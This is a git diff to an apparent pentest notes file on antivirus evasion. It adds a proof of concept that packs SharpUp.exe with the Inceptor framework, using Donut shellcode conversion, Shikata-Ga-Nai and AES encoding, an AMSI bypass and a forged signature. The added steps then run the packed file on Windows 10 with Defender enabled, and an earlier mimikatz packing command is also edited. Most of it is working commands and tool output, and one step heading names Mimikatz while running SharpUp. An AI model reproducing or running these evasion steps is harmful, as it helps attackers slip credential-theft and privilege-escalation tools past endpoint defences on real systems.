@@ -209,7 +209,7 @@ usage: inceptor.py 	  [-h] [-t {loader,donut,pe2sh,srdi}] [-m MODULES] [-O] [-P]
                           [-sd SIGN_DOMAIN] -o OUTFILE [--clone CLONE] [--delay DELAY] [-hw]
                           binary
 
-C:\Users\Administrator.PO718687\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 inceptor.py dotnet -t donut C:\temp\mimikatz.exe 
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 inceptor.py dotnet -t donut C:\temp\mimikatz.exe 
 --outfile C:\temp\Inceptor-Mimi1.exe --sgn --sign --module amsi --module anti_debug --arch x64 --delay 120
 
 [*] Multiple compatible templates identified, choose one:
@@ -325,3 +325,73 @@ Description :   Basic commands (does not require module name)
 mimikatz #
 mimikatz # exit
 Bye!
+
+
+========================================================================================================================================
+PoC / Example 2 - Running a packed version of SharUp.exe on a Windows 10 without being detected by the Microsoft Defender AV
+========================================================================================================================================
+
+-----------------------------------------------------------------------------------------------------------------------------
+Step 1 - Use the tool "Inceptor" to create a packed version of SharUp.exe
+-----------------------------------------------------------------------------------------------------------------------------
+
+C:\Users\Administrator\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor>python3 inceptor.py dotnet -t donut C:\temp\SharpUp.exe 
+--outfile C:\temp\Inceptor-SharpUp.exe --sgn --sign --module amsi --encoder aes --arch x64 --delay 60
+
+[*] Multiple compatible templates identified, choose one:
+  0: assembly_load.cs
+  1: classic.cs
+  2: service.cs
+  $> 1
+[DEBUG] Loading module Delay
+[DEBUG] Loading module AmsiBypass
+[+] .Net Artifact Generator Started At 2023-01-02 02:25:43.834526
+[*] Phase 0: Loading...
+[*] Phase 1: Converting binary into shellcode
+  [>] Transformer: Donut
+[*] Phase 2: Encoding
+  [>] Phase 2.1: Using Shikata-Ga-Nai x64 to encode the shellcode
+    [*] Encoded filename: C:\Users\Administrator.PO718687\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor\temp\tmpcme4jhh3.raw.sgn
+  [>] Phase 2.2: Using Inceptor chained encoder to encode the shellcode
+  [>] Encoder Chain: AesEncryptor
+  [>] Shellcode size: 54592
+  [>] Shellcode Signature: 5b982f4cf12cf2a282acc3e42682f902a583fff4
+[*] Phase 3: Generating source files using CLASSIC
+  [>] Phase 3.1: Writing CS file in .\temp\tmpnn4f2z36.cs
+  [>] Phase 3.2: Compiling and linking dependency files in "tmptapkancv.dll"
+[*] Phase 4: Compiling
+[*] Phase 5: Merging Resources
+  [+] Success: packed file stored at C:\Users\Administrator.PO718687\Documents\Tools-Pentest\1-Antivirus-bypass\inceptor-main\inceptor\temp\Inceptor-SharpUp-temp.exe
+  [+] File Signature: c2d7b3c2561c0026e7efd4e60924c5d84cb60bdc
+[*] Phase 6: Sign dotnet binary
+  [+] Signed with: CarbonCopy
+[*] Phase 7: Finalising
+  [+] Success: file stored at C:\temp\Inceptor-SharpUp.exe
+[*] Phase 8: Cleaning up
+[+] .Net Artifact Generator Finished At 2023-01-02 02:25:47.351488
+
+
+------------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Download and execute the packed version of Mimikatz.exe on a Windows 10 laptop without being detected by the Defender AV
+         which is enabled and up-to-date
+------------------------------------------------------------------------------------------------------------------------------------------
+
+PS C:\temp> Get-MpComputerStatus | Select RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntispywareSignatureLastUpdated,AntivirusSignatureLastUpdated  | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+AntispywareSignatureLastUpdated : 12/30/2022 8:02:22 AM
+AntivirusSignatureLastUpdated   : 12/30/2022 8:02:21 AM
+
+PS C:\temp> Inceptor-SharpUp.exe
+[+] Success. amsi.dll Patched!
+[*] Restoring memory protection...
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+[*] Already in high integrity, no need to privesc!
+
+[*] Quitting now, re-run with "audit" argument to run checks anyway (audit mode).
+
+[*] Completed Privesc Checks in 0 seconds
